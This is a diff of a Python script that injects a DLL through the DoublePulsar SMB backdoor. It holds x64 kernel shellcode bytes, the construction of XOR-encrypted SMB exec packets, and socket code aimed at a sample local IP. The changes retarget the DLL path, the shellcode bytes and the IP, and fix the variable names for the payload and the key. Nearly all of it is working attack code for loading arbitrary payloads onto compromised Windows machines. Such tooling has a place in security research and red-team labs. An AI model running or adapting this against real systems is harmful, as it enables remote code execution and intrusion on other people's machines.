@@ -21,13 +21,12 @@ def calculate_doublepulsar_arch(s):
 def read_dll_file_as_hex():
     global hex
     print("reading DLL into memory!")
-    with open("D:\\STRIKE\\64\\artifact.dll", "rb") as f:
+    with open("F:\\SPRING 2025\\native.dll", "rb") as f:
         data = f.read()
         hex = binascii.hexlify(data)
         print("file imported into memory!")
         print('File size: {:d}'.format(len(data)))
     return data
-
 
 def hexdump(src, length=16, sep='.'):
     """Hex dump bytes to ASCII string, padded neatly
@@ -182,8 +181,8 @@ rundll_kernel_shellcode += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0
 rundll_kernel_shellcode += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
 rundll_kernel_shellcode += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
 rundll_kernel_shellcode += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x28\x03\x00\x00"
-rundll_kernel_shellcode += b"\x20\x00\x00\x00\x70\x00\x00\x00\x08\x03\x00\x00\x4C\x00\x00\x00\xC8\x02\x00\x00\x01\x00\x00\x00\xBD\xA2\x37"
-rundll_kernel_shellcode += b"\x83\x00\x00\x00\x00\x00\x00\x00\x00\x8A\x23\x00\x00\x00\x00\x00\x00\x53\x55\x57\x56\x41\x54\x41\x55\x41\x56"
+rundll_kernel_shellcode += b"\x20\x00\x00\x00\x70\x00\x00\x00\x08\x03\x00\x00\x4C\x00\x00\x00\xC8\x02\x00\x00\x01\x00\x00\x00\x82\xE9\x43"
+rundll_kernel_shellcode += b"\x85\x00\x00\x00\x00\x00\x00\x00\x00\x8A\x23\x00\x00\x00\x00\x00\x00\x53\x55\x57\x56\x41\x54\x41\x55\x41\x56"
 rundll_kernel_shellcode += b"\x41\x57\x48\x89\xE0\x48\x89\xE1\x48\x83\xE1\x08\x48\x29\xCC\x48\x81\xEC\x00\x04\x00\x00\xE8\x00\x00\x00\x00"
 rundll_kernel_shellcode += b"\x5D\x48\x89\xE6\x48\x89\x06\x48\x81\xEC\x00\x04\x00\x00\x48\x8D\x3D\xD2\x0E\x00\x00\x49\x89\xF0\x48\x83\xC6"
 rundll_kernel_shellcode += b"\x08\x48\x31\xC9\x8A\x0F\x84\xC9\x74\x3F\x48\xFF\xC7\x8B\x0F\x48\x83\xC7\x04\x8B\x17\x48\x83\xC7\x04\x84\xD2"
@@ -341,7 +340,7 @@ if __name__ == "__main__":
 
     timeout = 5.0
     # sample IP
-    ip = "192.168.0.13"
+    ip = "192.168.0.70"
 
     # Connect to socket
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -531,7 +530,7 @@ if __name__ == "__main__":
 
             # last_payload_chunk = hex_bytes[Offset:remainder]
             # print(hexdump(last_payload_chunk))
-            remainder_bytes = b''.join([EncryptedPayload[Offset: Offset + remainder]])  # for i in range(0, len(hex_bytes), remainder)])
+            remainder_bytes = b''.join([xor_bytes[Offset: Offset + remainder]])  # for i in range(0, len(hex_bytes), remainder)])
             print("Length of last remainder bytes:  %d" % len(remainder_bytes))
 
             # remainder_bytes[i * 4096: (i + 1) * 4096] = file.read(4096)
@@ -545,7 +544,7 @@ if __name__ == "__main__":
             last_parameters += LastOffset
             last_parameters_bytearray = bytearray(last_parameters)
             print(hexdump(last_parameters_bytearray))
-            last_xor_parameters = byte_xor(last_parameters_bytearray, byte_xor_key)
+            last_xor_parameters = byte_xor(last_parameters_bytearray, key)
             print(hexdump(last_parameters_bytearray))
 
             last_doublepulsar_exec_packet[39] = TotalDataCount[0]
@@ -582,7 +581,7 @@ if __name__ == "__main__":
 	            print("Doublepulsar didn't succeed\n")
 
             BytesLeft -= remainder
-            print("Bytes left -> %d", BytesLeft)
+            print("Bytes left ->", BytesLeft)
 
         tree_disconnect = binascii.unhexlify("00000023ff534d4271000000001807c00000000000000000000000000008fffe00084100000000")
         tree_disconnect_packet = bytearray(tree_disconnect)
